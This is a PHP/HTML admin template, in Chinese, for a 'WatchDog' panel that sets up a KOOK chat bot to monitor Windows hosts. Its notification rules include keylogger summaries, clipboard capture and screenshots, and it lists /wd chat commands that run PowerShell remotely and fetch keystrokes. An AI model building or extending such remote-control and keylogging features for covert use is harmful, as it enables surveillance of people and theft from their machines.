<?php
defined('ABSPATH') || exit;
$settings     = WD_Kook::get_settings();
$notify_rules = json_decode($settings['notify_rules'] ?? '{}', true) ?? [];

$events = [
    // ── 平台事件 ──────────────────────────────────────────────────────
    'wd_login'       => ['WatchDog 平台登录',   true,  '有账号登录管理平台时推送'],
    'host_status'    => ['主机上线 / 离线',      true,  '主机状态变化时推送'],
    'cmd_exec'       => ['指令执行结果',          true,  '指令执行完毕后推送结果'],
    // ── 主机行为事件 ──────────────────────────────────────────────────
    'login'          => ['Win 新登录记录',        true,  '目标机器检测到 Windows 登录时推送'],
    'process_start'  => ['进程启动',              false, '每个进程启动时推送（量大，慎开）'],
    'process_kill'   => ['进程终止',              false, '进程被终止时推送'],
    'screenshot'     => ['截图捕获',              false, '客户端上传截图时推送通知'],
    'clipboard'      => ['剪贴板变化',            false, '剪贴板内容变化时推送'],
    'keyboard'       => ['键盘记录摘要',           false, '定时推送键盘摘要（慎开）'],
    'file_op'        => ['文件操作',              false, '文件下载 / 上传 / 删除操作时推送'],
    'registry_mod'   => ['注册表修改',            false, '注册表写入 / 删除操作时推送'],
    'winuser_mod'    => ['Win 用户变更',          false, '创建 / 删除 / 修改 Win 账号时推送'],
];

$webhook_url    = rest_url('watchdog/v1/kook-webhook');
$verify_token   = get_option('wd_kook_verify_token', '');
$cmd_channel    = get_option('wd_kook_cmd_channel', '');

include WD_THEME_DIR . '/templates/partials/layout-open.php';
?>

<div class="wd-page">
  <div class="wd-page-header">
    <h1 class="wd-page-title">KOOK 机器人配置</h1>
    <a href="https://developer.kookapp.cn/doc/intro" target="_blank" class="wd-btn wd-btn--ghost wd-btn--sm">开发文档 ↗</a>
  </div>

  <div class="wd-two-col wd-two-col--70-30">
    <div>

      <!-- ── Bot 基础配置 ── -->
      <div class="wd-card">
        <div class="wd-card-header"><h2>Bot 基础配置</h2></div>
        <div class="wd-card-body">
          <div class="wd-form-group">
            <label class="wd-label">Bot Token</label>
            <div class="wd-input-group">
              <input type="password" class="wd-input" id="kook-token"
                     value="<?= $settings ? '••••••••' : '' ?>"
                     placeholder="在 KOOK 开发者中心 → 机器人 → Token 处复制">
              <button class="wd-btn wd-btn--ghost" type="button"
                      onclick="this.previousElementSibling.type=this.previousElementSibling.type==='password'?'text':'password';this.textContent=this.previousElementSibling.type==='password'?'显示':'隐藏'">显示</button>
            </div>
          </div>
          <div class="wd-form-group">
            <label class="wd-label">默认推送频道 ID</label>
            <input type="text" class="wd-input" id="kook-channel"
                   value="<?= esc_attr($settings['default_channel_id'] ?? '') ?>"
                   placeholder="KOOK 文字频道 ID（右键频道 → 复制 ID）">
            <p class="wd-field-hint">
              ⚠️ 必须是<strong>文字频道 ID</strong>，不是服务器 ID。机器人需已加入该服务器并有发言权限，否则返回 400。
            </p>
          </div>
        </div>
        <div class="wd-card-footer">
          <div></div>
          <div class="wd-actions">
            <button class="wd-btn wd-btn--ghost" onclick="checkBot()">验证 Bot</button>
            <button class="wd-btn wd-btn--ghost" onclick="testKook()">发送测试</button>
            <button class="wd-btn wd-btn--primary" onclick="saveKook()">保存配置</button>
          </div>
        </div>
      </div>

      <!-- ── 推送规则 ── -->
      <div class="wd-card wd-mt-4">
        <div class="wd-card-header"><h2>推送规则</h2></div>
        <div class="wd-card-body">
          <?php foreach ($events as $key => [$label, $default, $hint]): ?>
            <?php $rule = $notify_rules[$key] ?? ['enabled' => $default, 'channel_id' => '']; ?>
            <div class="wd-rule-row">
              <label class="wd-toggle">
                <input type="checkbox" data-key="<?= $key ?>" <?= ($rule['enabled'] ?? $default) ? 'checked' : '' ?>>
                <span class="wd-toggle-track"><span class="wd-toggle-thumb"></span></span>
              </label>
              <div class="wd-rule-info">
                <strong><?= esc_html($label) ?></strong>
                <p class="wd-sm wd-muted"><?= esc_html($hint) ?></p>
              </div>
              <input type="text" class="wd-input wd-input--sm" data-ch="<?= $key ?>"
                     placeholder="频道 ID（留空用默认）"
                     value="<?= esc_attr($rule['channel_id'] ?? '') ?>">
            </div>
          <?php endforeach; ?>
        </div>
        <div class="wd-card-footer">
          <div></div>
          <div class="wd-actions">
            <button class="wd-btn wd-btn--primary" onclick="saveKook()">保存规则</button>
          </div>
        </div>
      </div>

      <!-- ── Webhook / 移动端指令 ── -->
      <div class="wd-card wd-mt-4">
        <div class="wd-card-header">
          <h2>移动端远程指令（KOOK Webhook）</h2>
          <span class="wd-badge wd-badge--blue">Beta</span>
        </div>
        <div class="wd-card-body">
          <p class="wd-sm wd-muted" style="margin-bottom:16px">
            配置后可在手机 KOOK 中向机器人发送 <code>/wd</code> 命令，实时控制在线主机终端。
          </p>

          <div class="wd-form-group">
            <label class="wd-label">Webhook 回调 URL（填入 KOOK 开发者中心）</label>
            <div class="wd-input-group">
              <input type="text" class="wd-input" id="webhook-url-display"
                     value="<?= esc_url($webhook_url) ?>" readonly>
              <button class="wd-btn wd-btn--ghost" type="button"
                      onclick="navigator.clipboard.writeText(document.getElementById('webhook-url-display').value);this.textContent='✓ 已复制'">复制</button>
            </div>
          </div>

          <div class="wd-form-group">
            <label class="wd-label">Verify Token（KOOK 开发者中心 → Webhook → 验证 Token）</label>
            <input type="text" class="wd-input" id="kook-verify-token"
                   value="<?= esc_attr($verify_token) ?>"
                   placeholder="粘贴 KOOK 提供的 Verify Token">
          </div>

          <div class="wd-form-group">
            <label class="wd-label">指令接收频道 ID（接收 /wd 命令的频道）</label>
            <input type="text" class="wd-input" id="kook-cmd-channel"
                   value="<?= esc_attr($cmd_channel) ?>"
                   placeholder="留空则所有频道均可接收">
            <p class="wd-field-hint">建议单独创建私密频道，避免其他人触发指令</p>
          </div>

          <div class="wd-info-box" style="background:rgba(31,111,235,.08);border:1px solid rgba(31,111,235,.3);border-radius:8px;padding:14px;margin-top:4px">
            <strong style="color:#58a6ff">可用指令格式：</strong><br>
            <code style="color:#79c0ff">/wd help</code> — 查看指令帮助<br>
            <code style="color:#79c0ff">/wd list</code> — 列出在线主机<br>
            <code style="color:#79c0ff">/wd {主机名} ps</code> — 获取进程列表<br>
            <code style="color:#79c0ff">/wd {主机名} run {命令}</code> — 执行 PowerShell 命令<br>
            <code style="color:#79c0ff">/wd {主机名} shot</code> — 远程截图<br>
            <code style="color:#79c0ff">/wd {主机名} keys</code> — 最近键盘记录
          </div>
        </div>
        <div class="wd-card-footer">
          <div></div>
          <div class="wd-actions">
            <button class="wd-btn wd-btn--primary" onclick="saveWebhook()">保存 Webhook 配置</button>
          </div>
        </div>
      </div>

    </div>

    <!-- ── 右侧使用说明 ── -->
    <div>
      <div class="wd-card">
        <div class="wd-card-header"><h2>快速接入步骤</h2></div>
        <div class="wd-card-body wd-sm">
          <ol class="wd-steps-list">
            <li>前往 <a href="https://developer.kookapp.cn/" target="_blank" class="wd-link">KOOK 开发者中心</a> 创建机器人</li>
            <li>在「机器人 → Token」处复制 Bot Token，填入左侧</li>
            <li>在 KOOK 中创建服务器和<strong>文字频道</strong></li>
            <li>邀请机器人进入服务器，赋予「发送消息」权限</li>
            <li>右键<strong>文字频道</strong> → 复制 ID，填入频道 ID</li>
            <li>点击「验证 Bot」确认连接</li>
            <li>点击「发送测试」验证推送</li>
          </ol>
          <div class="wd-info-box wd-mt-3" style="background:rgba(248,81,73,.08);border:1px solid rgba(248,81,73,.3);border-radius:6px;padding:10px;font-size:12px">
            <strong style="color:#f85149">400 错误常见原因：</strong><br>
            • 填的是服务器 ID 而非文字频道 ID<br>
            • 机器人未加入服务器<br>
            • 机器人在该频道无发言权限
          </div>
        </div>
      </div>

      <div class="wd-card wd-mt-4">
        <div class="wd-card-header"><h2>WS 中继地址</h2></div>
        <div class="wd-card-body">
          <div class="wd-form-group">
            <label class="wd-label">WebSocket 服务器地址</label>
            <input type="text" class="wd-input" id="ws-host-input"
                   value="<?= esc_attr(get_option('watchdog_ws_host','')) ?>"
                   placeholder="host:8765">
            <p class="wd-field-hint">Node.js WS 中继服务地址</p>
          </div>
          <button class="wd-btn wd-btn--ghost" onclick="saveWsHost()">保存地址</button>
        </div>
      </div>
    </div>

  </div>
</div>

<script>
document.getElementById('wd-topbar-title').textContent = 'KOOK 机器人配置';

async function saveKook() {
    const token   = document.getElementById('kook-token').value.trim();
    const channel = document.getElementById('kook-channel').value.trim();
    const rules   = {};
    document.querySelectorAll('[data-key]').forEach(cb => {
        const key = cb.dataset.key;
        const chEl = document.querySelector(`[data-ch="${key}"]`);
        rules[key] = { enabled: cb.checked, channel_id: chEl ? chEl.value.trim() : '' };
    });
    const tokenToSend = token === '••••••••' ? '' : token;
    const res = await WD.ajax('wd_save_kook', { bot_token: tokenToSend, default_channel_id: channel, notify_rules: JSON.stringify(rules) }, 'POST');
    res.success ? WD.toast('配置已保存 ✓') : WD.toast(res.data?.message || '保存失败', 'error');
}

async function testKook() {
    const res = await WD.ajax('wd_kook_test', {}, 'POST');
    res.success ? WD.toast('测试消息已发送') : WD.toast(res.data?.message || '发送失败：' + (res.data?.message || '请检查 Token 和频道 ID'), 'error');
}

async function checkBot() {
    WD.toast('验证中...');
    const res = await WD.ajax('wd_kook_check', {}, 'POST');
    if (res.success) {
        WD.toast(`Bot 连接正常 ✓  用户名：${res.data.username}`, 'success');
    } else {
        WD.toast('连接失败：' + (res.data?.message || '未知错误'), 'error');
    }
}

async function saveWebhook() {
    const token   = document.getElementById('kook-verify-token').value.trim();
    const channel = document.getElementById('kook-cmd-channel').value.trim();
    const res = await WD.ajax('wd_save_kook_webhook', { verify_token: token, cmd_channel: channel }, 'POST');
    res.success ? WD.toast('Webhook 配置已保存 ✓') : WD.toast(res.data?.message || '保存失败', 'error');
}

async function saveWsHost() {
    const v = document.getElementById('ws-host-input').value.trim();
    const r = await WD.ajax('wd_save_ws_host', { ws_host: v }, 'POST');
    r.success ? WD.toast('地址已保存') : WD.toast('保存失败','error');
}
</script>

<?php include WD_THEME_DIR . '/templates/partials/layout-close.php'; ?>
